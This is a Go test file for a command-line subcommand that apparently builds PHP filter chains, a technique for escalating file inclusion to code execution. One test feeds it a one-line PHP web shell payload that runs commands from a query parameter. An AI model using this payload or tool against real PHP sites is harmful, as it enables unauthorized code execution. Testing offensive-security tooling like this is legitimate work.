package cli

import (
	"bytes"
	"strings"
	"testing"
)

func TestPHPFilterCmd_RCE(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--rce", "<?php system($_GET[0]);?>"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	got := strings.TrimSpace(out.String())
	if !strings.HasPrefix(got, "php://filter/") {
		t.Errorf("expected php://filter chain, got %q", got)
	}
	if !strings.HasSuffix(got, "/resource=php://temp") {
		t.Errorf("expected default php://temp resource, got %q", got)
	}
}

func TestPHPFilterCmd_CustomResource(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--rce", "x", "--resource", "php://input"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	if !strings.Contains(out.String(), "/resource=php://input") {
		t.Errorf("custom resource not honoured: %q", out.String())
	}
}

func TestPHPFilterCmd_RawBase64Debug(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetArgs([]string{"--raw-base64", "QUJD", "--debug"})
	if err := cmd.Execute(); err != nil {
		t.Fatalf("execute: %v", err)
	}
	got := strings.TrimSpace(out.String())
	if strings.Contains(got, "convert.base64-decode/resource=") {
		t.Errorf("debug chain must not end in terminal decode: %q", got)
	}
}

func TestPHPFilterCmd_RequiresInput(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SilenceUsage = true
	cmd.SilenceErrors = true
	cmd.SetArgs([]string{})
	if err := cmd.Execute(); err == nil {
		t.Error("expected error when neither --rce nor --raw-base64 supplied")
	}
}

func TestPHPFilterCmd_MutuallyExclusive(t *testing.T) {
	cmd := newPHPFilterCmd()
	var out bytes.Buffer
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SilenceUsage = true
	cmd.SilenceErrors = true
	cmd.SetArgs([]string{"--rce", "x", "--raw-base64", "QUJD"})
	if err := cmd.Execute(); err == nil {
		t.Error("expected error when both --rce and --raw-base64 supplied")
	}
}
